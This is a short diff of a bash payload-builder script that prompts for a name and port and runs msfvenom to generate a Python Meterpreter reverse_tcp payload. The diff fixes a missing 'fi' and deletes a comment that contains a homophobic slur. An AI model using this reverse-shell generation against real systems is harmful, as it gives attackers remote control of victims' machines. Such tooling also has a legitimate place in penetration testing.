@@ -83,6 +83,7 @@ if [ -f $filename ]; then
   else
   echo "$bad $filename not found!"
 fi
+fi
 echo "Name for the payloads"
 read -p "PAYLOAD-NAME: " name
 clear
@@ -152,7 +153,7 @@ then
 
 read -p "LPORT: " port
 
-echo "Payload: /output/$name.py" #I  HATE PYTHON PYTHON=GAYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
+echo "Payload: /output/$name.py"
 
         msfvenom -p python/meterpreter/reverse_tcp LHOST=$ip LPORT=$port > output/$name.py
 
